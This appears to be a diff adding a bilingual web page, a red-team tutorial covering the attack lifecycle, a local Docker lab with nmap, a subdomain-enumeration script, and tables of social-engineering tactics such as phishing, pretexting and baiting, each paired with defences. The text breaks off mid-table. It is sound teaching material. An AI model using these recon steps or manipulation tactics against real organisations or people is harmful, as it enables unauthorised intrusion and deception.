@@ -1,0 +1,357 @@
+<!doctype html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+  <title data-i18n="rt.metaTitle">Red team 80/20: offensive concepts and defences | Baselarte</title>
+  <meta name="description" data-i18n-attributes="content:rt.metaDescription" content="A defensive-minded 80/20 of red team concepts: the attack lifecycle, social engineering and phishing simulation, SQL injection and XSS, reverse shells, all in a safe Docker lab (DVWA, Juice Shop, Gophish) with a named defence for every technique.">
+  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+  <meta name="author" content="Baselarte Ltda.">
+  <meta name="application-name" content="Baselarte">
+  <meta name="color-scheme" content="light dark">
+  <meta name="theme-color" content="#0d0e12">
+
+  <!-- Sets theme (by local time) and language before first paint. -->
+  <script src="../../boot.js"></script>
+  <link rel="canonical" href="https://baselarte.com/notas/red-team-80-20/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Baselarte">
+  <meta property="og:url" content="https://baselarte.com/notas/red-team-80-20/">
+  <meta property="og:title" data-i18n-attributes="content:rt.metaTitle" content="Red team 80/20: offensive concepts and defences | Baselarte">
+  <meta property="og:description" data-i18n-attributes="content:rt.metaDescription" content="A defensive-minded 80/20 of red team concepts: the attack lifecycle, social engineering and phishing simulation, SQL injection and XSS, reverse shells, all in a safe Docker lab (DVWA, Juice Shop, Gophish) with a named defence for every technique.">
+  <meta property="og:locale" data-i18n-attributes="content:meta.locale" content="en_US">
+  <meta property="og:locale:alternate" data-i18n-attributes="content:meta.localeAlternate" content="pt_BR">
+
+  <!-- Twitter / X -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" data-i18n-attributes="content:rt.metaTitle" content="Red team 80/20: offensive concepts and defences | Baselarte">
+  <meta name="twitter:description" data-i18n-attributes="content:rt.metaDescription" content="A defensive-minded 80/20 of red team concepts: the attack lifecycle, social engineering and phishing simulation, SQL injection and XSS, reverse shells, all in a safe Docker lab (DVWA, Juice Shop, Gophish) with a named defence for every technique.">
+
+  <!-- Icons & manifest -->
+  <link rel="icon" href="../../favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="../../favicon.ico" sizes="48x48">
+  <link rel="apple-touch-icon" href="../../assets/apple-touch-icon.png">
+  <link rel="manifest" href="../../site.webmanifest">
+
+  <!-- Performance -->
+  <link rel="stylesheet" href="../../styles.css">
+
+</head>
+<body>
+<svg class="icon-sprite" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
+  <symbol id="i-alert" viewBox="0 0 32 32"><path d="M16 4 2 28h28zM16 13v7M16 24h.01"/></symbol>
+  <symbol id="i-check" viewBox="0 0 32 32"><circle cx="16" cy="16" r="12"/><path d="M10.5 16.5l4 4 7-8"/></symbol>
+</svg>
+  <a class="skip-link" href="#main" data-i18n="skipLink">Skip to content</a>
+
+  <header class="site-header">
+    <div class="header-top">
+      <a class="site-wordmark" href="../../" aria-label="Baselarte">
+        <svg class="logo-mark" viewBox="0 0 32 32" aria-hidden="true"><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(-90.0 16 16) translate(16 16)"/><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(-18.0 16 16) translate(16 16)"/><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(54.0 16 16) translate(16 16)"/><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(126.0 16 16) translate(16 16)"/><path d="M -4.75,-2.5 C -9.025,-6.5 -5.35,-11.5 0,-15.0 C 5.35,-11.5 9.025,-6.5 4.75,-2.5 C 2.09,0.5 -2.09,0.5 -4.75,-2.5 Z" fill="currentColor" stroke="#8a5cf0" stroke-width="0.8" stroke-linejoin="round" transform="rotate(198.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(-90.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(-18.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(54.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(126.0 16 16) translate(16 16)"/><path d="M 0,-3.5 C 1.1,-7.5 0.6,-11.875 0,-13.7" fill="none" stroke="#8a5cf0" stroke-width="0.65" stroke-linecap="round" transform="rotate(198.0 16 16) translate(16 16)"/><circle cx="16" cy="16" r="1.9" fill="#8a5cf0"/></svg>
+        <span>baselarte</span>
+      </a>
+      <nav class="site-nav" data-i18n-attributes="aria-label:nav.label" aria-label="Main">
+        <a href="../../index.html#about" data-i18n="nav.about">About</a>
+        <a href="../../index.html#principles" data-i18n="nav.principles">Principles</a>
+        <a href="../index.html" data-i18n="nav.notes">Notes</a>
+      </nav>
+      <div class="header-tools">
+        <div class="theme-switch requires-js" role="group" data-i18n-attributes="aria-label:theme.label" aria-label="Theme">
+          <button type="button" data-theme-mode="auto" aria-pressed="true" data-i18n-attributes="title:theme.auto;aria-label:theme.auto" title="Automatic: dark from 18:00 to 06:00 by your clock" aria-label="Automatic: dark from 18:00 to 06:00 by your clock"><svg class="icon" viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="10"/><path d="M16 6a10 10 0 0 1 0 20z" fill="currentColor"/></svg></button>
+          <button type="button" data-theme-mode="light" aria-pressed="false" data-i18n-attributes="title:theme.light;aria-label:theme.light" title="Light theme" aria-label="Light theme"><svg class="icon" viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="5"/><path d="M16 3v4M16 25v4M3 16h4M25 16h4M6.8 6.8l2.8 2.8M22.4 22.4l2.8 2.8M6.8 25.2l2.8-2.8M22.4 9.6l2.8-2.8"/></svg></button>
+          <button type="button" data-theme-mode="dark" aria-pressed="false" data-i18n-attributes="title:theme.dark;aria-label:theme.dark" title="Dark theme" aria-label="Dark theme"><svg class="icon" viewBox="0 0 32 32" aria-hidden="true"><path d="M26 19.5A11 11 0 0 1 12.5 6 11 11 0 1 0 26 19.5z"/></svg></button>
+        </div>
+        <button class="language-toggle requires-js" type="button" data-language-toggle data-i18n-attributes="aria-label:languageToggle.description" aria-label="Ver em português">
+          <span data-i18n="languageToggle.label">PT</span>
+        </button>
+      </div>
+    </div>
+    <div class="header-sub">
+      <a class="section-name" href="../index.html"><svg class="icon" viewBox="0 0 32 32" aria-hidden="true"><path d="M5 6h8a3 3 0 0 1 3 3v17a3 3 0 0 0-3-3H5zM27 6h-8a3 3 0 0 0-3 3v17a3 3 0 0 1 3-3h8z"/></svg><span data-i18n="nav.section">Notes</span></a>
+      <nav class="sub-nav" data-i18n-attributes="aria-label:nav.section" aria-label="Notes">
+        <a href="../terraform/index.html"><span data-i18n="notes.tf.title">Terraform 80/20</span></a>
+        <a href="../aws/index.html">AWS</a>
+        <a href="../linux/index.html"><span data-i18n="notes.lx.title">How Linux works</span></a>
+        <details class="nav-menu">
+          <summary data-i18n="nav.menu">All notes</summary>
+          <ul class="nav-menu-list"><li><a href="../aws/index.html">AWS</a></li><li><a href="../terraform/index.html"><span data-i18n="notes.tf.title">Terraform 80/20</span></a></li><li><a href="../github-aws-oidc/index.html"><span data-i18n="notes.oidc.title">GitHub to AWS with OIDC</span></a></li><li><a href="../cloudflare/index.html"><span data-i18n="notes.cf.title">Cloudflare: domain, R2 and SSL</span></a></li><li><a href="../linux/index.html"><span data-i18n="notes.lx.title">How Linux works</span></a></li><li><a href="../postgres-for-devs/index.html"><span data-i18n="notes.pg.title">Postgres for developers</span></a></li><li><a href="../security-lab/index.html"><span data-i18n="notes.sec.title">Security and networking lab</span></a></li><li><a href="../red-team-80-20/index.html" aria-current="page"><span data-i18n="notes.rt.title">Red team 80/20</span></a></li><li><a href="../software-engineering-at-google/index.html"><span data-i18n="notes.seg.title">Software Engineering at Google</span></a></li><li><a href="../ai-engineering/index.html"><span data-i18n="notes.aie.title">AI Engineering</span></a></li><li><a href="../entendendo-algoritmos/index.html"><span data-i18n="notes.alg.title">Grokking Algorithms</span></a></li><li><a href="../full-stack-engineering/index.html"><span data-i18n="notes.fs.title">Anatomy of a full-stack platform</span></a></li></ul>
+        </details>
+      </nav>
+      <div class="header-actions">
+        <a class="btn btn-secondary" href="../index.html" data-i18n="nav.index">Index</a>
+        <a class="btn btn-primary" href="../terraform/index.html" data-i18n="nav.start">Terraform 80/20</a>
+      </div>
+    </div>
+  </header>
+
+  <main id="main">
+    <div class="page-layout">
+      <nav class="docs-sidebar" id="docs-sidebar" data-i18n-attributes="aria-label:nav.section" aria-label="Notes">
+        <a class="sidebar-home" href="../index.html"><svg class="icon" viewBox="0 0 32 32" aria-hidden="true"><path d="M20 6 10 16l10 10"/></svg><span data-i18n="sidebar.home">Notes home</span></a>
+        <div class="sidebar-filter"><svg class="icon" viewBox="0 0 32 32" aria-hidden="true"><circle cx="14" cy="14" r="8"/><path d="m20 20 8 8"/></svg><input type="search" data-sidebar-filter placeholder="Filter notes" data-i18n-attributes="placeholder:sidebar.filter;aria-label:sidebar.filter" aria-label="Filter notes"></div>
+        <h2 data-i18n="sidebar.groupCloud">Cloud and infrastructure</h2>
+        <ul data-sidebar-group>
+          <li><a href="../aws/index.html">AWS</a></li>
+          <li><a href="../terraform/index.html"><span data-i18n="notes.tf.title">Terraform 80/20</span></a></li>
+          <li><a href="../github-aws-oidc/index.html"><span data-i18n="notes.oidc.title">GitHub to AWS with OIDC</span></a></li>
+          <li><a href="../cloudflare/index.html"><span data-i18n="notes.cf.title">Cloudflare: domain, R2 and SSL</span></a></li>
+        </ul>
+        <h2 data-i18n="sidebar.groupSystems">Systems</h2>
+        <ul data-sidebar-group>
+          <li><a href="../linux/index.html"><span data-i18n="notes.lx.title">How Linux works</span></a></li>
+          <li><a href="../postgres-for-devs/index.html"><span data-i18n="notes.pg.title">Postgres for developers</span></a></li>
+        </ul>
+        <h2 data-i18n="sidebar.groupSecurity">Security</h2>
+        <ul data-sidebar-group>
+          <li><a href="../security-lab/index.html"><span data-i18n="notes.sec.title">Security and networking lab</span></a></li>
+          <li><a href="../red-team-80-20/index.html" aria-current="page"><span data-i18n="notes.rt.title">Red team 80/20</span></a></li>
+        </ul>
+        <h2 data-i18n="sidebar.groupBooks">Book notes</h2>
+        <ul data-sidebar-group>
+          <li><a href="../software-engineering-at-google/index.html"><span data-i18n="notes.seg.title">Software Engineering at Google</span></a></li>
+          <li><a href="../ai-engineering/index.html"><span data-i18n="notes.aie.title">AI Engineering</span></a></li>
+          <li><a href="../entendendo-algoritmos/index.html"><span data-i18n="notes.alg.title">Grokking Algorithms</span></a></li>
+        </ul>
+        <h2 data-i18n="sidebar.groupCase">Case study</h2>
+        <ul data-sidebar-group>
+          <li><a href="../full-stack-engineering/index.html"><span data-i18n="notes.fs.title">Anatomy of a full-stack platform</span></a></li>
+        </ul>
+      </nav>
+      <aside class="side-nav" id="side-nav">
+  <nav data-i18n-attributes="aria-label:sideNav.label" aria-label="On this page">
+    <h2 data-i18n="sideNav.onThisPage">On this page</h2>
+<ul>
+<li><a href="#intro-rt"><span class="pt">Antes de começar: o ciclo e o laboratório</span><span class="en">Before you start: the lifecycle and the lab</span></a></li>
+<li><a href="#recon-rt"><span class="pt">Reconhecimento: mapear antes de tocar</span><span class="en">Recon: mapping before touching</span></a></li>
+<li><a href="#social-eng"><span class="pt">Engenharia social: o elo mais explorado</span><span class="en">Social engineering: the most exploited link</span></a></li>
+<li><a href="#exploitation"><span class="pt">Exploração: SQL injection e XSS</span><span class="en">Exploitation: SQL injection and XSS</span></a></li>
+<li><a href="#shell"><span class="pt">Do comando ao shell: o que vem depois</span><span class="en">From command to shell: what comes next</span></a></li>
+<li><a href="#cheat-rt"><span class="pt">Cola e revisão</span><span class="en">Cheat sheet and review</span></a></li>
+</ul>
+  </nav>
+</aside>
+      <article class="reading-column ds-guide">
+<nav class="breadcrumbs" data-i18n-attributes="aria-label:breadcrumb.label" aria-label="Breadcrumb"><ol><li><a href="../../">Baselarte</a></li><li><a href="../index.html" data-i18n="nav.notes">Notes</a></li><li aria-current="page"><span data-i18n="notes.rt.title">Red team 80/20</span></li></ol></nav>
+<section class="hero" aria-labelledby="hero-title">
+  <p class="monospace-label hero-kicker" data-i18n="rt.kicker">Hands-on lab</p>
+  <h1 id="hero-title" class="hero-title" data-i18n="rt.heroTitle">Red team, <em>the 80/20.</em></h1>
+  <p class="hero-lede" data-i18n="rt.heroLede">The attack lifecycle, social engineering, web exploitation and reverse shells — each one in a safe Docker lab, each one paired with the defence that stops it.</p>
+</section>
+<section class="content-section" aria-labelledby="intro-rt">
+<h2 id="intro-rt"><span class="pt">Antes de começar: o ciclo e o laboratório</span><span class="en">Before you start: the lifecycle and the lab</span></h2>
+
+<p><span class="pt">"Red team" é o time que ataca de propósito, com contrato e limites claros, para encontrar falhas antes de quem não tem boas intenções encontrar. Esta nota é um 80/20 do que esse time faz: as fases de um ataque, uma ferramenta ou técnica típica de cada uma, e — tão importante quanto — a defesa que neutraliza cada uma delas. Tudo aqui roda contra alvos de laboratório que você mesmo sobe em Docker, nunca contra sistemas de terceiros.</span><span class="en">"Red team" is the group that attacks on purpose, under contract and clear boundaries, to find flaws before someone without good intentions does. This note is an 80/20 of what that group does: the phases of an attack, a typical tool or technique for each, and — just as important — the defence that neutralises each one. Everything here runs against lab targets you spin up yourself in Docker, never against someone else's systems.</span></p>
+<div class="callout warn"><svg class="icon" aria-hidden="true"><use href="#i-alert"/></svg> <span class="pt">Isto não é um manual de invasão: é um mapa, no nível de uma certificação como CompTIA Security+/PenTest+ ou de um curso introdutório de OSCP/eJPT. As técnicas citadas são de conhecimento público (MITRE ATT&CK, OWASP) e os laboratórios usam alvos feitos de propósito para serem atacados (DVWA, Metasploitable, Juice Shop). Testar qualquer uma delas fora de um laboratório seu, ou sem um contrato de pentest assinado, pode ser crime — mesmo "só para ver se funciona".</span><span class="en">This is not a how-to-break-in manual: it is a map, at the level of a CompTIA Security+/PenTest+ certification or an introductory OSCP/eJPT course. The techniques named are public knowledge (MITRE ATT&CK, OWASP) and the labs use targets built on purpose to be attacked (DVWA, Metasploitable, Juice Shop). Trying any of this outside a lab of your own, or without a signed pentest contract, can be a crime — even "just to see if it works".</span></div>
+<h3><span class="pt">O ciclo de um ataque</span><span class="en">The attack lifecycle</span></h3>
+<figure class="fig"><div class="fig-scroll"><svg viewBox="0 0 800 120" role="img" aria-label="A cadeia de ataque / The attack chain" style="min-width:700px">
+<rect x="10" y="10" width="88" height="56" rx="4" class="ln fillsoft"/>
+<text x="54.0" y="42.0" class="" text-anchor="middle">Recon</text>
+<rect x="110" y="10" width="88" height="56" rx="4" class="ln fillsoft"/>
+<text x="154.0" y="42.0" class="pt " text-anchor="middle">Acesso
+inicial</text><text x="154.0" y="42.0" class="en " text-anchor="middle">Initial
+access</text>
+<path d="M98 38L110 38" class="ln"/><path d="M102.8 41.5L110 38L102.8 34.5" class="ln"/>
+<rect x="210" y="10" width="88" height="56" rx="4" class="ln fillsoft"/>
+<text x="254.0" y="42.0" class="pt " text-anchor="middle">Execução</text><text x="254.0" y="42.0" class="en " text-anchor="middle">Execution</text>
+<path d="M198 38L210 38" class="ln"/><path d="M202.8 41.5L210 38L202.8 34.5" class="ln"/>
+<rect x="310" y="10" width="88" height="56" rx="4" class="ln fillsoft"/>
+<text x="354.0" y="42.0" class="pt " text-anchor="middle">Escalada</text><text x="354.0" y="42.0" class="en " text-anchor="middle">Privilege
+escalation</text>
+<path d="M298 38L310 38" class="ln"/><path d="M302.8 41.5L310 38L302.8 34.5" class="ln"/>
+<rect x="410" y="10" width="88" height="56" rx="4" class="ln fillsoft"/>
+<text x="454.0" y="42.0" class="pt " text-anchor="middle">Persistência</text><text x="454.0" y="42.0" class="en " text-anchor="middle">Persistence</text>
+<path d="M398 38L410 38" class="ln"/><path d="M402.8 41.5L410 38L402.8 34.5" class="ln"/>
+<rect x="510" y="10" width="88" height="56" rx="4" class="ln fillsoft"/>
+<text x="554.0" y="42.0" class="pt " text-anchor="middle">Movimento
+lateral</text><text x="554.0" y="42.0" class="en " text-anchor="middle">Lateral
+movement</text>
+<path d="M498 38L510 38" class="ln"/><path d="M502.8 41.5L510 38L502.8 34.5" class="ln"/>
+<rect x="610" y="10" width="88" height="56" rx="4" class="ln fillsoft"/>
+<text x="654.0" y="42.0" class="pt " text-anchor="middle">Exfiltração</text><text x="654.0" y="42.0" class="en " text-anchor="middle">Exfiltration</text>
+<path d="M598 38L610 38" class="ln"/><path d="M602.8 41.5L610 38L602.8 34.5" class="ln"/>
+<text x="10" y="100" class="pt mut">Baseado nas táticas do MITRE ATT&CK — o catálogo público de técnicas usado por ofensiva e defesa.</text><text x="10" y="100" class="en mut">Based on MITRE ATT&CK tactics — the public technique catalogue used by both offence and defence.</text>
+</svg></div><figcaption><span class="pt">Cada seção desta nota cobre um elo desta cadeia, com o conceito, um laboratório seguro e a defesa.</span><span class="en">Each section of this note covers one link of this chain, with the concept, a safe lab and the defence.</span></figcaption></figure>
+<h3><span class="pt">O laboratório: tudo em Docker, isolado</span><span class="en">The lab: all in Docker, isolated</span></h3>
+<p><span class="pt">Os exercícios usam três alvos de treino bem conhecidos, cada um feito de propósito para ter falhas: <strong>DVWA</strong> (Damn Vulnerable Web Application), <strong>OWASP Juice Shop</strong> e <strong>Metasploitable2</strong>. Uma rede Docker própria os isola da sua rede real — releia a seção de Docker da nota de segurança e redes antes de começar, se ainda não viu como a rede de contêineres funciona.</span><span class="en">The exercises use three well-known training targets, each built on purpose to have flaws: <strong>DVWA</strong> (Damn Vulnerable Web Application), <strong>OWASP Juice Shop</strong> and <strong>Metasploitable2</strong>. A Docker network of its own isolates them from your real network — re-read the Docker section of the security and networking note first if you have not seen how container networking works.</span></p>
+<pre><code>mkdir lab-redteam &amp;&amp; cd lab-redteam
+cat &gt; docker-compose.yml &lt;&lt;<span class="tok-s">'EOF'</span>
+services:
+  dvwa:
+    image: vulnerables/web-dvwa
+    ports: [<span class="tok-s">"127.0.0.1:8081:80"</span>]     <span class="tok-c"># só no seu localhost, nunca 0.0.0.0</span>
+    networks: [lab]
+  juice-shop:
+    image: bkimminich/juice-shop
+    ports: [<span class="tok-s">"127.0.0.1:8082:3000"</span>]
+    networks: [lab]
+  kali:
+    image: kalilinux/kali-rolling
+    command: sleep infinity
+    networks: [lab]
+networks:
+  lab:
+    driver: bridge
+EOF
+docker compose up -d
+docker compose exec kali bash -c <span class="tok-s">"apt update &amp;&amp; apt install -y nmap curl netcat-traditional sqlmap"</span>
+docker compose exec kali nmap -sV dvwa juice-shop   <span class="tok-c"># confirma que os dois alvos estão de pé</span></code></pre>
+<p><span class="pt"><strong>Resultado esperado:</strong> o nmap mostra a porta 80 (DVWA) e 3000 (Juice Shop) abertas, com os respectivos servidores web identificados. As portas publicadas (<code>-p</code>) ficam só em <code>127.0.0.1</code>: nada disso fica acessível de fora do seu computador.</span><span class="en"><strong>Expected result:</strong> nmap shows port 80 (DVWA) and 3000 (Juice Shop) open, with their web servers identified. The published ports are bound only to <code>127.0.0.1</code>: none of this is reachable from outside your computer.</span></p>
+</section>
+<section class="content-section" aria-labelledby="recon-rt">
+<h2 id="recon-rt"><span class="pt">Reconhecimento: mapear antes de tocar</span><span class="en">Recon: mapping before touching</span></h2>
+
+<p><span class="pt">Antes de atacar qualquer coisa, um red team levanta o máximo de informação possível sem tocar no alvo diretamente (<em>recon passivo</em>) e só depois toca de leve para confirmar (<em>recon ativo</em>, como o nmap que você já viu).</span><span class="en">Before attacking anything, a red team gathers as much information as possible without touching the target directly (<em>passive recon</em>), and only afterwards touches it lightly to confirm (<em>active recon</em>, like the nmap you already saw).</span></p>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Técnica</span><span class="en">Technique</span></th><th><span class="pt">O que revela</span><span class="en">What it reveals</span></th><th><span class="pt">Ferramenta típica</span><span class="en">Typical tool</span></th></tr></thead><tbody><tr><td><span class="pt">WHOIS e DNS</span><span class="en">WHOIS and DNS</span></td><td><span class="pt">dono do domínio, servidores de e-mail, subdomínios</span><span class="en">domain owner, mail servers, subdomains</span></td><td><code>whois</code>, <code>dig</code></td></tr><tr><td><span class="pt">Motores de busca especializados</span><span class="en">Specialised search engines</span></td><td><span class="pt">dispositivos e serviços expostos na internet, por empresa/país</span><span class="en">devices and services exposed on the internet, by company/country</span></td><td>Shodan, Censys</td></tr><tr><td><span class="pt">Metadados de arquivos públicos</span><span class="en">Metadata in public files</span></td><td><span class="pt">nomes de funcionários, software usado, caminhos internos, em PDFs/DOCX do site</span><span class="en">employee names, software used, internal paths, in the site's PDFs/DOCX</span></td><td>exiftool</td></tr><tr><td><span class="pt">Redes sociais e vazamentos públicos</span><span class="en">Social media and public breach data</span></td><td><span class="pt">e-mails, cargos, senhas reutilizadas de vazamentos antigos (para phishing e senha)</span><span class="en">emails, job titles, reused passwords from old breaches (for phishing and passwords)</span></td><td>LinkedIn, Have I Been Pwned</td></tr><tr><td><span class="pt">Enumeração de subdomínios</span><span class="en">Subdomain enumeration</span></td><td><span class="pt">mais superfície de ataque do que o site principal sugere</span><span class="en">more attack surface than the main site suggests</span></td><td>amass, subfinder</td></tr></tbody></table></div>
+<h3><span class="pt">Um script simples de enumeração</span><span class="en">A simple enumeration script</span></h3>
+<p><span class="pt">Os times profissionais usam ferramentas prontas (amass, subfinder); entender o script por trás ajuda a saber o que elas realmente fazem.</span><span class="en">Professional teams use ready-made tools (amass, subfinder); understanding the script behind them helps you know what they actually do.</span></p>
+<pre><code><span class="tok-c">#!/usr/bin/env python3</span>
+<span class="tok-c"># enum_subdominios.py — tenta resolver cada nome de uma lista contra um domínio.</span>
+<span class="tok-c"># Uso educacional: rode só contra domínios SEUS ou de laboratório (ex.: um domínio de teste seu).</span>
+import socket
+import sys
+
+dominio = sys.argv[1]                     <span class="tok-c"># ex.: meulab.test</span>
+palavras = [<span class="tok-s">"www"</span>, <span class="tok-s">"api"</span>, <span class="tok-s">"dev"</span>, <span class="tok-s">"staging"</span>, <span class="tok-s">"vpn"</span>, <span class="tok-s">"mail"</span>, <span class="tok-s">"admin"</span>]
+
+for palavra in palavras:
+    alvo = f<span class="tok-s">"{palavra}.{dominio}"</span>
+    try:
+        ip = socket.gethostbyname(alvo)
+        print(f<span class="tok-s">"{alvo} -&gt; {ip}"</span>)
+    except socket.gaierror:
+        pass                               <span class="tok-c"># não existe; segue para o próximo</span></code></pre>
+<p><span class="pt"><strong>Resultado esperado:</strong> uma lista de subdomínios que de fato resolvem para um IP, a partir de uma lista de palavras comuns — a mesma lógica, só que com listas de milhares de palavras e em paralelo, por trás de ferramentas como o <code>amass</code>.</span><span class="en"><strong>Expected result:</strong> a list of subdomains that actually resolve to an IP, from a list of common words — the same logic, just with lists of thousands of words and running in parallel, behind tools like <code>amass</code>.</span></p>
+<h3><span class="pt">Defesa: reduzir o que existe para ser encontrado</span><span class="en">Defence: shrink what there is to find</span></h3>
+<ul class="ds-list"><li><span class="pt">Inventário de ativos: você só protege o que sabe que existe. Mantenha um inventário de domínios, subdomínios e serviços expostos — é também o que o atacante está tentando reconstruir.</span><span class="en">Asset inventory: you only protect what you know exists. Keep an inventory of domains, subdomains and exposed services — it is also what the attacker is trying to reconstruct.</span></li><li><span class="pt">Remova metadados de arquivos publicados (muitas suítes de escritório fazem isso ao exportar para PDF).</span><span class="en">Strip metadata from published files (many office suites do this on PDF export).</span></li><li><span class="pt">Monitore menções e vazamentos da sua organização (Have I Been Pwned tem uma API para domínios inteiros).</span><span class="en">Monitor mentions and leaks of your organisation (Have I Been Pwned has an API for whole domains).</span></li><li><span class="pt">Desative subdomínios e serviços que não são mais usados; um "dev.empresa.com" esquecido costuma ter a configuração mais fraca de todas.</span><span class="en">Disable subdomains and services no longer in use; a forgotten "dev.company.com" usually has the weakest configuration of all.</span></li></ul>
+</section>
+<section class="content-section" aria-labelledby="social-eng">
+<h2 id="social-eng"><span class="pt">Engenharia social: o elo mais explorado</span><span class="en">Social engineering: the most exploited link</span></h2>
+
+<p><span class="pt">A maioria das invasões reais não começa com um exploit técnico: começa com uma pessoa confiando em quem não devia. <em>Engenharia social</em> é a técnica de manipular essa confiança. É também, segundo relatórios anuais de resposta a incidentes (como o Verizon DBIR), o vetor inicial mais comum de violação de dados — mais do que qualquer vulnerabilidade de software.</span><span class="en">Most real breaches do not start with a technical exploit: they start with a person trusting someone they should not have. <em>Social engineering</em> is the technique of manipulating that trust. It is also, according to annual incident-response reports (like the Verizon DBIR), the most common initial breach vector — more than any single software vulnerability.</span></p>
+<h3><span class="pt">Os seis princípios de influência (Cialdini)</span><span class="en">The six principles of influence (Cialdini)</span></h3>
+<p><span class="pt">O psicólogo Robert Cialdini catalogou os gatilhos que fazem pessoas dizerem "sim" — e são exatamente os que um pretexto de engenharia social explora.</span><span class="en">Psychologist Robert Cialdini catalogued the triggers that make people say "yes" — and they are exactly the ones a social-engineering pretext exploits.</span></p>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Princípio</span><span class="en">Principle</span></th><th><span class="pt">Como aparece num ataque</span><span class="en">How it shows up in an attack</span></th></tr></thead><tbody><tr><td><span class="pt">Autoridade</span><span class="en">Authority</span></td><td><span class="pt">"Sou do suporte de TI / da diretoria" — um crachá falso, um e-mail que parece do chefe</span><span class="en">"I'm from IT support / from the board" — a fake badge, an email that looks like it's from the boss</span></td></tr><tr><td><span class="pt">Urgência/escassez</span><span class="en">Urgency/scarcity</span></td><td><span class="pt">"Sua conta será bloqueada em 1 hora" — não dá tempo de pensar ou confirmar</span><span class="en">"Your account will be locked in 1 hour" — no time to think or verify</span></td></tr><tr><td><span class="pt">Prova social</span><span class="en">Social proof</span></td><td><span class="pt">"Todo o seu time já preencheu isso" — nomes reais de colegas aumentam a credibilidade</span><span class="en">"Your whole team already filled this out" — real colleagues' names boost credibility</span></td></tr><tr><td><span class="pt">Simpatia/afinidade</span><span class="en">Liking</span></td><td><span class="pt">um perfil falso que parece interessado nos mesmos hobbies, antes de pedir algo</span><span class="en">a fake profile that seems interested in the same hobbies, before asking for something</span></td></tr><tr><td><span class="pt">Reciprocidade</span><span class="en">Reciprocity</span></td><td><span class="pt">um "favor" pequeno antes (segurar a porta, ajudar com algo) antes do pedido real</span><span class="en">a small "favour" first (holding the door, helping with something) before the real ask</span></td></tr><tr><td><span class="pt">Compromisso/coerência</span><span class="en">Commitment/consistency</span></td><td><span class="pt">fazer a pessoa concordar com algo pequeno primeiro, depois pedir mais</span><span class="en">getting the person to agree to something small first, then asking for more</span></td></tr></tbody></table></div>
+<h3><span class="pt">As táticas mais comuns</span><span class="en">The most common tactics</span></h3>
+<div class="scroll-x"><table class="ds-table"><thead><tr><th><span class="pt">Tática</span><span class="en">Tactic</span></th><th><span class="pt">Como funciona</span><span class="en">How it works</span></th></tr></thead><tbody><tr><td><span class="pt">Phishing</span><span class="en">Phishing</span></td><td><span class="pt">e-mail em massa fingindo ser de um serviço confiável, com um link ou anexo malicioso</span><span class="en">mass email pretending to be from a trusted service, with a malicious link or attachment</span></td></tr><tr><td><span class="pt">Spear phishing</span><span class="en">Spear phishing</span></td><td><span class="pt">phishing dirigido a UMA pessoa, com detalhes reais sobre ela (cargo, projetos, colegas) para parecer legítimo</span><span class="en">phishing aimed at ONE person, with real details about them (role, projects, colleagues) to look legitimate</span></td></tr><tr><td><span class="pt">Vishing</span><span class="en">Vishing</span></td><td><span class="pt">a mesma ideia, por telefone — "sou do banco, preciso confirmar seu código"</span><span class="en">the same idea, by phone — "I'm from the bank, I need to confirm your code"</span></td></tr><tr><td><span class="pt">Pretexting</span><span class="en">Pretexting</span></td><td><span class="pt">uma história inventada e consistente (um técnico, um auditor, um novo funcionário) para justificar um pedido fora do comum</span><span class="en">a made-up, consistent story (a technician, an auditor, a new hire) to justify an out-of-the-ordinary request</span></td></tr><tr><td><span class="pt">Baiting</span><span class="en">Baiting</span></td><td><span class="pt">deixar um pendrive "esquecido" no estacionamento, esperando que alguém o conecte por curiosidade</span><span class="en">leaving a "lost" USB drive in the parking lot, hoping someone plugs it in out of curiosity</span></td></tr><tr><td><span class="pt">Tailgating</span><span class="en">Tailgating</span></td><td><span class="pt">seguir alguém por uma porta com controle de acesso, sem crachá próprio, confiando na educação da pessoa</span><span class="en">following someone through 